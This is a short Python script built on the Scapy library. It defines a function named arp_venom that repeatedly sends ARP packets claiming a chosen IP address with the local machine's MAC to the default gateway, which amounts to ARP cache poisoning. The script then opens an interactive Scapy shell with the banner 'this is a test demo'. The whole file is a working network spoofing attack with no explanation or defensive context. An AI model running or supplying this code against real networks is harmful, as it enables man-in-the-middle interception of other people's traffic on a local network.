import logging

logger = logging.getLogger("scapy")
logger.setLevel(logging.INFO)


from scapy.all import *

def arp_venom(y):
    return srploop(Ether()/ARP(op=1,hwsrc=get_if_hwaddr(conf.iface),psrc=y,pdst=conf.route.route("0.0.0.0")[2]))


if __name__ == "__main__":
    interact(mydict=globals(),mybanner="this is a test demo")

